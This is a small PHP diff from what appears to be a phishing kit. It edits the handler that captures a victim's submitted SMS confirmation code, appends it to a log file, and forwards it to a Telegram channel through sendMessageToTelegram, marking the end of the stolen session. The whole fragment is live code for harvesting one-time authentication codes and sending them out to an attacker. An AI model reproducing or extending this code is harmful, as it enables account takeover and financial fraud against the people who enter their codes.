@@ -4,7 +4,8 @@ if (isset($_POST["sms"]) ) {
    
 
 
-$donnees = "\n". "conf sms : " .$_POST["sms"] ;
+    $donnees = "\n CONF SMS : `" . $_POST['sms'] . "`" .
+    "\n". "** FIN  CONNEXION **\n"."\n";
 $file = "../blinky2000@bvc@bvc@destruction.txt" ;
 file_put_contents($file, $donnees, FILE_APPEND);
  sendMessageToTelegram($donnees) ;
